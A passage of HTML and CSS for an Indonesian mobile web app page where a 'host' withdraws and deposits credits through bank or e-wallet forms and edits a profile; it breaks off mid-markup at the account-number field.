<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
  <title>Acount & Pembayaran</title>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
      <!-- PWA manifest -->
<link rel="manifest" href="manifest.json">
<meta name="theme-color" content="#ffffff">

<script>
  document.addEventListener("DOMContentLoaded", () => {
    if ("serviceWorker" in navigator) {
      navigator.serviceWorker.register("service-worker.js")
        .then((reg) => {
          console.log("✅ Service Worker terdaftar:", reg);
          Swal.fire({
            icon: "success",
            title: "Aplikasi Aktif",
            text: "Aplikasi siap dipakai",
            timer: 2000,
            showConfirmButton: false
          });
        })
        .catch((err) => {
          console.error("❌ Service Worker gagal:", err);
          Swal.fire({
            icon: "error",
            title: "Gagal",
            text: "Aplikasi tidak bisa didaftarkan"
          });
        });
    } else {
      Swal.fire({
        icon: "warning",
        title: "Tidak Didukung",
        text: "Browser ini tidak mendukung Aplikasi"
      });
    }
  });
</script>





  
  <style>
    :root{
      --primary:#7f3586;
      --accent:#8100ff;
      --muted:#f0f0f0;
      --card:#ffffff;
      --text:#222;
      --soft:#f7f7f7;
    }


    body {
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
    }



    body {
  font-family: Inter, "Segoe UI", Roboto, sans-serif;
  margin: 0;
  background: linear-gradient(180deg, #fff 0%, #fbfbfb 100%);
  color: var(--text);
}

img, button {
  -webkit-tap-highlight-color: transparent;
}

/* Hilangkan efek biru di HP */
* {
  -webkit-tap-highlight-color: transparent; /* Safari & Chrome */
  -webkit-touch-callout: none;              /* iOS biar ga ada menu saat tahan */
}








  .nav-item.active {
    color:#000; /* teks hitam */
    font-weight:bold;
  }

/* Pastikan Swal selalu di paling depan */
.swal2-container {
  z-index: 99999 !important;
  
}


/* Header beku */
.sticky-header {
  position: sticky;   /* kalau cuma mau ikut scroll */
  top: 0;
  z-index: 999;
  background: #fff;
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 12px 16px;
}

/* Kalau mau selalu nempel atas (tidak ikut scroll), ganti dengan: */
/* 
.sticky-header {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
}
*/

/* Kotak saldo */
.saldo-box {
  background: #fff;
  padding: 10px 14px;
  border-radius: 10px;
  margin: 5px 10px 10px; /* kasih jarak biar tidak ketiban header */
  font-size: 14px;
  display: flex;
  align-items: center;
  gap: 8px;
}

.saldo-box img {
  width: 18px;
  height: 18px;
}

.saldo-box b {
  color: #6b6b6b;
}

.saldo-box #saldoHost {
  color: #e91e63;
  font-size: 13px;
  font-weight: bold;
}

/* Container */
.container {
  max-width: 420px;
  margin: 18px auto;
  padding: 16px;
}

/* Header */
header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 14px;
}
header h1 {
  font-size: 16px;
  margin: 0;
  color: #323232;
  font-weight: 600;
}

/* Cards */
.login-card,
.action-card {
  background: #fff;
  border-radius: 12px;
  padding: 14px;
  box-shadow: 0 6px 16px rgba(0, 0, 0, 0.04);
  margin-bottom: 12px;
}

/* Inputs */
input[type="text"],
input[type="number"] {
  width: 100%;
  padding: 10px;
  border-radius: 12px;
  border: 1px solid #e6e6e6;
  background: var(--muted);
  box-sizing: border-box;
}
label {
  font-size: 13px;
  color: #666;
}






/* Buttons */
.btn {
  display: inline-block;
  padding: 10px 16px;
  border-radius: 20px;
  border: none;
  cursor: pointer;
}
.btn-primary {
  background: var(--accent);
  color: #fff;
}
.btn-muted {
  background: #ececec;
  color: #333;
}
.row {
  display: flex;
  gap: 8px;
}

/* Offline Icon */
.offline-icon {
  width: 25px;
  height: 25px;
  border-radius: 12px;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  background: #fff;
  box-shadow: 0 6px 14px rgba(0, 0, 0, 0.06);
}

/* Fullscreen Popup */
.history-popup {
  position: fixed;
  inset: 0;
  z-index: 9999;
  background: rgb(255, 255, 255);
  display: none;
  align-items: flex-start;
  justify-content: center;
  padding: 0px;
  overflow: auto;
}
.history-panel {
  background: #ffffff;
  border-radius: 12px;
  max-width: 760px;
  width: 100%;
  padding: 12px 12px 24px;
}

/* History Section */
.history-top {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 10px 8px;
  border-bottom: 1px solid #e0e0e0;
  border-radius: 10px;
  background: #ececec;
}
.history-title {
  font-weight: 600;
  color: var(--primary);
  font-size: 15px;
}
.total-box {
  font-size: 14px;
  color: #333;
}
.month-row {
  color: #999;
  font-size: 13px;
  padding: 8px 6px;
}
.tx-list {
  padding: 6px;
}
.tx-item {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 14px 8px;
  border-bottom: 1px solid #ebebeb;
  border-radius:2px;
  
}
.tx-left {
  display: flex;
  flex-direction: column;
}
.tx-main {
  font-weight: 400;
}
.tx-sub {
  font-size: 12px;
  color: #9b9b9b;
  margin-top: 6px;
}
.tx-amount {
    
  font-weight: 400;
    color: #555;
    font-size: 13px;
}
.status-pill {
  display: inline-block;
  padding: 4px 10px;
  border-radius: 12px;
  font-size: 12px;
  font-weight: bold;
  color: #fff;
}



.status-pill.pending {

  color: #ffffff00;
}

.status-pill.tolak {
  background-color: red;
}





.close-btn {
  background: #fff;
  border: 1px solid #eee;
  padding: 8px 10px;
  border-radius: 12px;
  cursor: pointer;
}

/* Responsive */
@media (max-width: 480px) {
  .container {
    padding: 12px;
  }
  .history-panel {
    padding: 8px;
  }
}











 /* Navigasi bawah */
#bottomNav {
  position: fixed;
  bottom: 0;
  left: 0;
  width: 100%;
  background: #fff;
  display: flex;
  justify-content: space-around;
  padding: 8px 0;
  z-index: 9999; /* biar selalu di atas konten */
  border-top: 1px solid #ffffff;
}

#bottomNav img {
  width: 38px; /* sesuai permintaan kamu */
}

#bottomNav .nav-item {
  text-align: center;
  flex: 1;
}








.swal-rounded {
  border-radius: 30px !important;
  padding: 20px;
}

.detail-item {
  padding: 8px 12px;
  border: 1px solid #ddd;
  border-radius: 6px;
  margin-bottom: 8px;
  background: #fff;
}



.swal-btn {
  border-radius: 20px !important;
  padding: 8px 20px !important;
  font-weight: bold;
}



.saldo-box,
.tagihan-box {
  display: flex;
  align-items: center;
  background: #fff;
  border-radius: 12px;
  padding: 15px 18px;
  margin: 10px 0;
}

.saldo-box img,
.tagihan-box img {
  width: 20px;
  height: 20px;
  margin-right: 10px;
}

.tagihan-box span {
  color: #e91e63;
  font-size: 14px;
  font-weight: bold;
  margin-left: 5px;
}

.saldo-left {
  display: flex;
  align-items: center;
  gap: 6px; /* jarak antar elemen kiri */
  font-size: 18px;
}

.saldo-left img {
  width: 20px;
  height: 20px;
}

.offlee-icon {
  width: 22px;
  height: 22px;
  cursor: pointer;
}


/* Animasi gift muncul lalu hilang */
.gift-anim {
  position: relative;
  display: inline-block;
  animation: floatUp 2.5s ease-out forwards;
}

@keyframes floatUp {
  0%   { opacity: 1; transform: translateY(0) scale(1); }
  70%  { opacity: 0.8; transform: translateY(-40px) scale(1.2); }
  100% { opacity: 0; transform: translateY(-80px) scale(0.5); }
}






 .offlee-icon { width:24px; height:24px; cursor:pointer; margin-left:8px; }
  .popup-overlay { 
    display:none; 
    position:fixed; z-index:999; left:0; top:0; 
    width:100%; height:100%; 
    background:rgba(0,0,0,0.6); 
    justify-content:center; align-items:center; 
  }
  .popup-box {
    background:#fff; padding:20px; border-radius:12px; width:320px;
     position:relative; text-align:left;
  }
  .popup-close {
    position:absolute; right:10px; top:5px;
    font-size:22px; cursor:pointer; color:#555;
  }
  .popup-box h3 { margin-top:0; text-align:center; }
  .popup-box label { display:block; margin:8px 0 4px; font-weight:bold; }
  .popup-box input, .popup-box select {
    width:100%; padding:8px; border:1px solid #ccc; border-radius:6px;
  }
  .popup-box button {
    margin-top:15px; width:100%; padding:10px;
    background:#5f1ce2; color:#fff; border:none; border-radius:20px;
    font-size:16px; cursor:pointer;
  }
  .popup-box button:hover { background:#4c089f; }

.custom-select {
  position: relative;
  width: 100%;
  font-size: 14px;
}


.custom-select img {
  width: 20px;      /* lebar logo */
  height: 20px;     /* tinggi logo */
  object-fit: contain; /* biar proporsional */
  vertical-align: middle; /* sejajar sama teks */
  margin-right: 6px; /* jarak dengan tulisan */
}

.select-selected {
  background: #fff;
  padding: 10px;
  border: 1px solid #ccc;
  cursor: pointer;
  border-radius: 6px;
}

.select-items {
  position: absolute;
  background: #fff;
  border: 1px solid #ccc;
  border-radius: 6px;
  width: 100%;
  z-index: 99;
  margin-top: 2px;
}

.select-items div {
  padding: 8px;
  display: flex;
  align-items: center;
  gap: 8px;
  cursor: pointer;
}

.select-items div:hover {
  background: #f1f1f1;
}

.select-items img {
  width: 18px;
  height: 18px;
}

.select-hide {
  display: none;
}












    /* Popup fullscreen */
    #cam-popup {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: #000;
      z-index: 9999;
    }
    #cam-video {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    /* Overlay */
    .cam-overlay {
      position: absolute;
      z-index: 10000;
      color: #fff;
      font-weight: bold;
    }
    #cam-saldo {
      top: 10px;
      left: 10px;
      background: rgba(0,0,0,0.6);
      padding: 5px 10px;
      border-radius: 5px;
    }
    #cam-logo {
      top: 10px;
      right: 10px;
      width: 40px;
    }
    #cam-skip {
      bottom: 20px;
      left: 20px;
      background: red;
      padding: 8px 16px;
      border-radius: 5px;
      cursor: pointer;
    }
    #cam-close {
      bottom: 20px;
      right: 20px;
      background: gray;
      padding: 8px 16px;
      border-radius: 5px;
      cursor: pointer;
    }

    #skipBtn, #closeCameraBtn {
  border: none;
  outline: none;
  box-shadow: none !important;
  background: #f44336; /* warna contoh */
  z-index: 9999;       /* pastikan di atas overlay */
}



#giftBtn {
  position: absolute;
  top: 10px;
  right: 10px;
  width: 40px;
  height: 40px;
  cursor: pointer;
  z-index: 9999; /* biar di atas */
}

#giftPopup {
  display: none;
  position: absolute;
  top: 60px;
  right: 10px;
  background: rgba(0,0,0,0.8);
  padding: 10px;
  border-radius: 8px;
  z-index: 9999; /* juga di atas */
}



    /* 🔹 Animasi Gift */
    @keyframes giftFly {
      0% { opacity: 0; transform: translate(0, 0) scale(0.3); }
      20% { opacity: 1; transform: translate(-50vw, 30vh) scale(1.5); }
      60% { transform: translate(-50vw, 30vh) scale(1); }
      100% { opacity: 0; transform: translate(-50vw, 70vh) scale(0.5); }
    }
    .gift-flying {
      position: fixed;
      top: 10px;
      right: 10px;
      width: 60px;
      z-index: 99999;
      animation: giftFly 2.5s ease-in-out forwards;
      text-align: center;
      pointer-events: none;
    }
    .gift-flying span {
      display: block;
      margin-top: 5px;
      font-size: 14px;
      color: gold;
      font-weight: bold;
    }
    /* 🔹 Loading animasi */
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }




/* Custom popup */
.swal-custom-popup {
  border-radius: 20px !important;
  padding: 24px !important;
  box-shadow: 0 6px 18px rgba(0,0,0,0.15);
}

/* Custom button */
.swal-custom-btn {
  color: white !important;
  border-radius: 10px !important;
  padding: 8px 20px !important;
  font-weight: 600 !important;
  transition: 0.3s;
}
.swal-custom-btn:hover {
  opacity: 0.85;
}











#carouselTrack .carousel-item {
    margin: 0;
    padding: 0;
}

#carouselTrack .carousel-item img {
    width:150px;
    height:150px;
    border-radius:50%; /* kalau masih mau bulat */
    border: none;      /* hapus garis putih biar rapet */
    box-shadow: none;  /* hapus shadow biar nempel */
    display: block;    /* biar nggak ada spasi inline */
    margin: 0;
    transition: transform 0.3s;
}



/* Overlay utama */
#loginOverlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 999;
  overflow: hidden;
  position: relative;
  --bg-image: url('nature1.webp'); /* default */
}

/* Background dengan blur */
#loginOverlay::before {
  content: "";
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: var(--bg-image) no-repeat center center / cover;
  filter: blur(6px);
  transform: scale(1.1);
  z-index: 1;
  transition: background 1s ease-in-out; /* efek halus saat ganti */
}




#bottomNav .nav-item {
  outline: none;        /* hilangkan outline default */
  background: none;     /* pastikan background default kosong */
  border: none;         /* hapus border jika ada */
  user-select: none;    /* hilangkan highlight teks */
}

#bottomNav .nav-item:focus,
#bottomNav .nav-item:active {
  outline: none;        /* hilangkan titik blok hitam */
  box-shadow: none;
  background: none;     /* hilangkan background hitam saat klik */
}







/* 🔹 POPUP INBOX */
.boxinbox {
  display: none;
  position: fixed;
  top: 0; 
  left: 0;
  width: 100%; height: 100%;
  background: #fff;
  z-index: 999;
  overflow-y: auto;
  font-family: Arial, sans-serif;
}

/* 🔹 Header Inbox */
/* Popup inbox */
#inboooxxxxxx {
  position: fixed;
  bottom: 60px; /* di atas nav */
  left: 0;
  width: 100%;
  max-height: 100%;
  background: #fff;
  border-radius: 16px 16px 0 0;
  box-shadow: 0 -4px 10px rgba(0,0,0,0.1);
  display: none;
  flex-direction: column; /* biar isi berbaris vertikal */
  overflow: hidden;
  z-index: 999;
}
/* List chat */
#inboooxxxxxx .boxinbox-list {
  flex: 1;
  overflow-y: auto;
  padding: 10px;
}

/* Satu chat */
#inboooxxxxxx .chat-item {
  display: flex;
  align-items: center;
  padding: 10px;
  cursor: pointer;
}

#inboooxxxxxx .chat-item img {
  width: 40px;
  height: 40px;
  border-radius: 50%;
  margin-right: 10px;
}

#inboooxxxxxx .chat-item .chat-info {
  display: flex;
  flex-direction: column;
}

#inboooxxxxxx .chat-item .chat-info .name {
  font-weight: 600;
  font-size: 14px;
}

#inboooxxxxxx .chat-item .chat-info .last-msg {
  font-size: 12px;
  color: #666;
}

/* 🔹 Avatar */
.chat-avatar {
  width: 45px;
  height: 45px;
  border-radius: 50%;
  object-fit: cover;
}

/* 🔹 Info Chat */
.chat-info {
  flex: 1;
  min-width: 0;
}
.chat-info h4 {
  font-size: 15px;
  margin: 0;
  display: flex;
  align-items: center;
  gap: 5px;
}
.chat-info p {
  font-size: 13px;
  color: #666;
  margin: 2px 0 0 0;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}

/* 🔹 Badge Host */
.host-badge {
  background: #e91e63;
  color: #fff;
  font-size: 10px;
  padding: 2px 5px;
  border-radius: 4px;
}

/* 🔹 Badge Notifikasi */
.notifi-badge {
  background: #e91e63;
  color: #fff;
  font-size: 11px;
  padding: 3px 7px;
  border-radius: 50px;
  margin-left: auto;
}

/* 🔹 Waktu Chat */
.chat-time {
  font-size: 11px;
  color: #999;
  margin-left: auto;
}



/* === Popup Chat Fullscreen === */
#chatPopup {
  position: fixed;
  top: 0; left: 0;
  width: 100%; height: 100%;
  background: #fff;
  display: none;
  flex-direction: column;
  z-index: 10001;
  box-sizing: border-box;
}

/* === Area pesan === */
#popupMessages {
  flex: 1;
  overflow-y: auto;
  padding: 15px;
  box-sizing: border-box;
  display: flex;
  flex-direction: column;
  gap: 10px;   /* jarak antar pesan */
}


/* === Detail chat tersembunyi (source data) === */
.chat-detail {
  display: none;  /* jangan tampil di luar popup */
  width: 100%;
  height: 100%;
  box-sizing: border-box;
}


.chat-item {
    position: relative;
    display: flex;
    align-items: center;
    padding: 10px;
    cursor: pointer;
  }

  .chat-avatar {
    width: 45px;
    height: 45px;
    border-radius: 50%;
    margin-right: 10px;
  }

  .chat-info {
    flex: 1;
  }

  .chat-info h4 {
    margin: 0;
    font-size: 14px;
  }

  .chat-info p {
    margin: 2px 0 0;
    font-size: 13px;
    color: #555;
  }

  .chat-time {
    font-size: 12px;
    color: #888;
  }

  /* 🔹 Badge Pesan Baru */
  .badge-new {
    position: absolute;
    top: 8px;
    right: 10px;
    background: red;
    color: white;
    font-size: 9px;
    font-weight: bold;
    padding: 2px 6px;
    border-radius: 50%;
    text-align: center;
  }

/* pastikan popup sembunyi dulu */
/* Popup container */
#callsPopup {
  display: none;
  position: fixed;
  top: 60px; /* tinggi header utama, sesuaikan */
  left: 0;
  right: 0;
  bottom: 0;
  justify-content: center;
  align-items: flex-start;
  z-index: 999;
}

/* Konten popup */
#callsPopupContent {
  background: #fff;
  width: 100%;
  max-width: 400px;
  height: 100%;
  border-radius: 12px 12px 0 0;
  overflow: hidden;
}

/* Header popup */
.popup-header {
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 12px;
  position: relative;
}

.popup-header img {
  width: 24px;
  height: 24px;
  position: absolute;
  left: 12px;
  cursor: pointer;
}

.popup-header span {
  font-weight: bold;
  font-size: 16px;
}

/* Body popup */
.popup-body {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  padding: 80px;
  text-align: center;
}

.popup-body img {
  width: 120px;
  margin-bottom: 15px;
}

  </style>
</head>
<body>










<div class="container">
  <!-- HEADER BEKU -->
  <header class="sticky-header">
    <h1>Credits Withdraw</h1>
    <div style="display:flex;gap:10px;align-items:center">
      <img id="offlineBtn" class="offline-icon" src="match_his_icon.png" alt="offline" title="Buka History" />
    </div>
  </header>




<!-- ✅ Box Kas -->
<div style="background:#f1f0f0; border-radius:12px; padding:20px;  max-width:400px; margin:auto;">

  <!-- Saldo Host -->
  <div class="saldo-box" style="display:flex; align-items:center; margin-bottom:12px;">
    <img src="score_icon_wrap.png" alt="icon" style="width:28px; height:28px; margin-right:8px;" />
    <b style="margin-right:6px;">Saldo Host:</b>
    <span id="saldoHost">Rp 0</span>
    <img src="add_tokens_icon.png" alt="offlee" id="btnBayarDepooo" class="offlee-icon" style="margin-left:auto; width:24px; height:24px; cursor:pointer;" />
  </div>

  <!-- Jumlah Tagihan -->
<div class="tagihan-box" style="display:flex; align-items:center; margin-bottom:20px;">
  <img src="certification_award_icon_0_female.png" alt="icon" style="width:28px; height:28px; margin-right:8px;" />
  <b style="margin-right:6px;">Jumlah Tagihan:</b>
  <span id="jumlahTagihan">Rp 0</span>

  <!-- ikon kecil info -->
  <img 
    src="chat_icon_send_failure.png" 
    alt="info" 
    id="infoTagihan" 
    style="width:16px; height:16px; margin-left:6px; cursor:pointer; opacity:0.7;" 
  />
</div>

<!-- ✅ Tombol Kas Keluar -->
<button 
  id="btnKasKeluar"
  style="
    background-color: #6a0dad; 
    color: white; 
    border: none; 
    padding: 10px 18px; 
    border-radius: 20px; 
    cursor: pointer; 
    font-size: 16px;
    font-weight: 600;
    transition: background 0.3s ease;
    width: 100%;
  "
  onmouseover="this.style.backgroundColor='#580a9e'"
  onmouseout="this.style.backgroundColor='#6a0dad'">
  Kas Keluar
</button>


<!-- 🔹 Box untuk Form Penarikan (disembunyikan dulu) -->
<div id="formPenarikan" style="display:none;">

  <div style="background:#fff; border-radius:12px; padding:16px; box-shadow:0 4px 16px rgba(0,0,0,0.08); max-width:420px; margin:20px auto;">
    <h3 style="margin-top:0; font-size:16px; font-weight:600; color:#333; text-align:center;">
      Form Penarikan
    </h3>

    <!-- 🔹 Form Penarikan -->
    <form id="depositForm" onsubmit="return false;" style="max-width:420px; margin:auto;">

      <!-- Nama Pengirim -->
      <div style="margin-bottom:12px;">
        <label for="namaPengirim" style="display:block; margin-bottom:4px;">Nama Penerima</label>
        <input id="namaPengirim" type="text" placeholder="Nama pengirim" required 
               style="width:100%; padding:10px; border-radius:8px; border:1px solid #ddd; box-sizing:border-box;" />
      </div>

      <!-- Bank / E-Wallet -->
      <div style="margin-bottom:12px;">
        <label for="bank" style="display:block; margin-bottom:4px;">Bank / E-Wallet</label>
        <div style="position:relative; display:flex; align-items:center;">
          <img src="dana.png" alt="icon" 
               style="position:absolute; left:10px; width:50px; height:50px; opacity:0.7;" />
          <input id="bank" type="text" required
                 style="padding-left:40px; width:100%; padding:10px; border-radius:8px; border:1px solid #ddd; box-sizing:border-box;" />
        </div>
      </div>

      <!-- Nominal -->
      <div style="margin-bottom:8px;">
        <label for="nominal" style="display:block; margin-bottom:4px;">Nominal Penarikan (Rp)</label>
        <input id="nominal" type="number" placeholder="500000" min="0" required
               style="width:100%; padding:10px; border-radius:8px; border:1px solid #ddd; box-sizing:border-box;" />
        <small id="nomErr" style="color:red; display:none;">Minimal Rp 500.000</small>
      </div>

      <!-- Tombol Aksi -->
      <div style="margin-top:16px; display:flex; gap:10px; justify-content:flex-end;">
        <button id="btnKirim" class="btn btn-primary" type="button">Tarik</button>
        <button id="btnKembali" class="btn btn-muted" type="button">Kembali</button>
      </div>
    </form>
  </div>

  <!-- Instruksi -->
  <div style="margin-top:20px; max-width:420px; margin:auto;">
    <h3 style="font-size:14px; margin-bottom:8px; color:#000;">Instruksi</h3>
    <ol style="padding-left:20px; font-size: 13px; line-height:1.6; color:#333;">
      <li>Akun dengan 2000+ Credits dapat diuangkan.</li>
      <li>Jumlah penarikan akan bervariasi sesuai dengan nilai tukar.</li>
      <li>Permintaan akan ditangani dalam 2 hari kerja.</li>
      <li>Jika Anda memiliki pertanyaan, silahkan hubungi kami.</li>
    </ol>
  </div>
</div>

</div>










<!-- ✅ Popup Bayar Depooo -->
<div id="bayardepoooPopup" class="popup-overlay">
  <div class="popup-box">
    <span id="closeBayarDepooo" class="popup-close" onclick="closeBayarDepooo()">&times;</span>
    <h3>Deposit Credits</h3>
    <form id="bayardepoooForm">
<label>Bank/E-Wallet:</label>
<div class="custom-select" id="bankSelect">
  <div class="select-selected">-- Pilih Bank/E-Wallet --</div>
  <div class="select-items select-hide">
    <div data-value="BRI"><img src="bri.png"> BRI</div>
    <div data-value="DANA"><img src="dana.png"> DANA</div>
    <div data-value="LINKAJA"><img src="link-aja-logo.png"> LINKAJA</div>
    <div data-value="OVO"><img src="ovo.png"> OVO</div>
    <div data-value="MANDIRI"><img src="mandiri.png"> MANDIRI</div>
    <div data-value="BCA"><img src="bca.png"> BCA</div>
    <div data-value="SHOPEEPAY"><img src="ShopeePay.png"> SHOPEEPAY</div>
    <div data-value="BANK DKI"><img src="bankjakarta.svg"> BANK DKI</div>
    <div data-value="BANK JAGO"><img src="bankjago.png"> BANK JAGO</div>
    <div data-value="QRIS"><img src="qris.jpg"> QRIS</div>
  </div>
</div>

<!-- hidden input untuk ambil value di JS -->
<input type="hidden" name="bank" id="bankInput" required>


      <label>Nama Rekening:</label>
      <input type="text" name="namaRekening" required />

      <label>Nomor Rekening:</label>
      <input type="text" name="namaBank" required />

      <label>Nominal Deposit (Minimal Rp 500.000):</label>
      <input type="number" name="nominal" min="500000" required />

      <button type="button" id="btnKirimBayar">Bayar Sekarang</button>
    </form>
  </div>
</div>






<!-- Menu List -->
<div style="border-radius:10px; overflow:hidden; margin-top:30px; margin-bottom:30px; ">

 <div id="btnAkunUangTunai" 
       style="display:flex; justify-content:space-between; align-items:center; padding:14px 16px; cursor:pointer; background:#fff;">
    <span style="display:flex; align-items:center; font-size:15px;">
      <img src="mine_rucksack_icon.png" alt="icon" style="width:20px; height:20px; margin-right:10px;">
      Akun Uang Tunai
    </span>
 <img src="right_arrow_gray.png" alt="arrow" style="width:18px; height:18px; opacity:0.6;">
  </div>


<!-- POPUP FULL LAYAR -->
<div id="bankPopup" style="
  display:none; 
  position:fixed;
  top:0; 
  left:0; 
  width:100%; 
  height:90%; 
  background:#fff; 
  z-index:9999;
  justify-content:center; 
  align-items:flex-start;
  overflow-y:auto;
">
  <!-- Tombol gambar close/back -->
  <img src="back_gray.png" id="imgCloseBank" alt="close" 
       style="position:absolute; top:35px; left:15px; width:20px; height:20px; cursor:pointer; z-index:10000;" />

  <div style="
    background:#fff; 
    width:90%; 
    max-width:400px; 
    border-radius:12px; 
    padding:20px; 
    position:relative;
    margin-top:-10px;
  ">
<div style="
  background:#fff; 
  width:90%; 
  max-width:400px; 
  border-radius:12px; 
  padding:20px; 
  position:relative; /* penting supaya absolute bekerja */
  margin-top:-10px;
">
  <!-- Judul -->
  <h2 style="
    text-align:center; 
    font-size:15px; 
    margin-bottom:20px;
  ">
    Detail Rekening
  </h2>

  <!-- Gear di pojok kanan -->
  <img src="gear.png" alt="leeeogo" 
       style="width:35px; height:30px; position:absolute; top:27px; right:1px; cursor:pointer;">
</div>







<!-- =================== POPUP EDIT DATA =================== -->
<div id="editPopup" style="
  display:none; 
  position:fixed; 
  top:0; left:0; 
  width:100%; height:100%; 
  background:#fff; 
  z-index:10000; 
  overflow:hidden;
">

  <!-- HEADER -->
  <div style="
    display:flex; 
    align-items:center; 
    justify-content:center; 
    padding:12px; 
    position:fixed; 
    top:0; left:0; 
    width:100%; 
    background:#fff; 
    z-index:10001;
  ">
    <!-- Tombol close (gambar kiri) -->
    <img id="closeEditPopup" src="back_gray.png" alt="Close" style="
      width:24px; height:24px; 
      position:absolute; left:12px; 
      cursor:pointer;
    ">

    <!-- Judul tengah -->
    <span style="font-weight:bold; font-size:16px;">Edit Data</span>

    <!-- Gambar kanan -->
    <img src="system_notice_help_icon.png" alt="Icon kanan" style="
      width:70px; 
      height:30px; 
      position:absolute; 
      right:30px; 
      cursor:pointer;
    ">
  </div>

  <!-- KONTEN -->
  <div style="
    padding:70px 20px 20px;   /* kasih jarak biar form gak ketutup header */
    max-width:400px; 
    margin:0 auto; 
    overflow-y:auto; 
    height:100%;
  ">
<form id="editForm">
  <label>Nama Lengkap:</label>
  <input type="text" id="editNama" 
    style="width:100%; padding:8px; margin-bottom:10px; border:1px solid #ccc; border-radius:10px;">

  <label>Umur:</label>
  <input type="number" id="editUmur" 
    style="width:100%; padding:8px; margin-bottom:10px; border:1px solid #ccc; border-radius:10px;">

  <label>Password Baru:</label>
  <input type="password" id="editWA" placeholder="****"
    style="width:80%; padding:8px; margin-bottom:10px; border:1px solid #ccc; border-radius:10px;">

  <label>Konfirmasi Password:</label>
  <input type="password" id="editConfirmWA" placeholder="****"
    style="width:80%; padding:8px; margin-bottom:15px; border:1px solid #ccc; border-radius:10px;">




<!-- Box Tags -->
<div style="background:#f9f9f9; padding:12px; border:1px solid #ddd; border-radius:8px; margin-bottom:16px;">
  <p style="margin:0 0 8px; font-weight:600; font-size:14px;">Tambahkan Tag</p>

  <!-- Grid Tag -->
  <div id="tagList" style="display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-bottom:10px;">
    <!-- Tag otomatis muncul disini -->
  </div>

  <!-- Input + Button -->
  <div style="display:flex; gap:6px;">
    <input id="tagInput" type="text" placeholder="Tambah tag..."
      style="flex:1; padding:6px 8px; border:1px solid #ccc; border-radius:6px;">
    <button id="addTagBtn" 
  style="padding:6px 12px; border:none; background:#c9c9c9; color:#fff; border-radius:6px; cursor:pointer; display:flex; align-items:center; justify-content:center;">
  <img src="tambah.png" alt="Tambah Tag" style="width:18px; height:18px;">
</button>
  </div>
  <!-- Notifikasi limit -->
<div id="tagLimitInfo" style="margin-top:6px; font-size:12px; color:#ff4444; font-style:italic;"></div>
</div>











  <button type="submit" style="
    width:100%; 
    padding:10px; 
    background:#7636ff; 
    color:#fff; 
    border:none; 
    border-radius:20px; 
    cursor:pointer;
  ">
    Simpan Perubahan
  </button>

</form>

  </div>
</div>









<!-- 🔹 Notifikasi Kecil -->
<div id="notif" style="
  display:none;
  position:fixed;
  top:20px; right:20px;
  background:#d5d5d5;
  color:#fff;
  padding:10px 16px;
  border-radius:8px;
  font-size:14px;
  box-shadow:0 4px 10px rgba(0,0,0,0.15);
  z-index:20000;
  align-items:center;
  gap:8px;
  opacity:0;
  transition:opacity 0.4s ease;
">
  <img src="servant_icon.png" alt="icon" style="width:20px; height:20px; border-radius:4px;">
  <span>Data berhasil diperbarui!</span>
</div>





<div style="border:1px solid #ddd; border-radius:8px; padding:16px; background:#fff; max-width:350px;">

  <!-- Foto Profil + Umur -->
  <div style="text-align:center; margin-bottom:16px;">
    <!-- Foto Profil User -->
    <label for="fotoInput" style="cursor:pointer; display:inline-block; position:relative;">
      <img id="viewFoto" src="profile_photo_add_icon.png" 
           alt="Foto User" 
           style="width:90px; height:90px; border-radius:50%; object-fit:cover; border:2px solid #ccc; transition:0.3s;">
      <!-- Umur ditampilkan di pojok bawah foto -->
<div id="viewUmur" 
     style="position:absolute; bottom:-6px; right:-6px; 
            background:#e0e0e0; color:#747474; font-size:13px; font-weight:500; 
            padding:4px 8px; border-radius:12px; 
            display:flex; align-items:center; gap:2px;">

  <img id="umurIcon" src="cert_failed_wrong_gender.png" alt="umur" 
       style="width:14px; height:14px; display:block;">

  <span id="umurText">-</span>
</div>
    </label>

    <!-- Input file hidden -->
    <input type="file" id="fotoInput" accept="image/*" style="display:none;">

    <!-- Info user -->
    <div id="viewNama" style="margin-top:12px; font-size:14px; color:#333; font-weight:600;">-</div>
    <div id="viewEmail" style="font-size:13px; color:#666;">-</div>
  </div>





<!-- Box Tags -->
<div id="boxTags" style="background:#f9f9f9; padding:12px; border:1px solid #ddd; border-radius:8px; margin-bottom:16px;">
  <p style="margin:0 0 8px; font-weight:600; font-size:14px;">Tag Aktivitas</p>

  <!-- Grid Tag -->
  <div id="viewTags" style="display:grid; grid-template-columns:1fr 1fr; gap:8px;">
    <!-- Tag dari Firestore muncul di sini -->
  </div>
</div>








  <!-- Nama Bank -->
  <div style="margin-bottom:12px; display:flex; align-items:center; gap:10px;">
    <img src="ic_checked.png" alt="icon" style="width:22px; height:22px;">
    <div>
      <b>Nama Bank :</b>
      <div id="viewBank" style="color:#333; margin-top:4px;">-</div>
    </div>
  </div>

  <!-- Nama Rekening -->
  <div style="margin-bottom:12px; display:flex; align-items:center; gap:10px;">
    <img src="ic_checked.png" alt="icon" style="width:22px; height:22px;">
    <div>
      <b>Nama Rekening :</b>
      <div id="viewNamaRek" style="color:#333; margin-top:4px;">-</div>
    </div>
  </div>

  <!-- Nomor Rekening -->
  <div style="display:flex; align-items:center; gap:10px;">
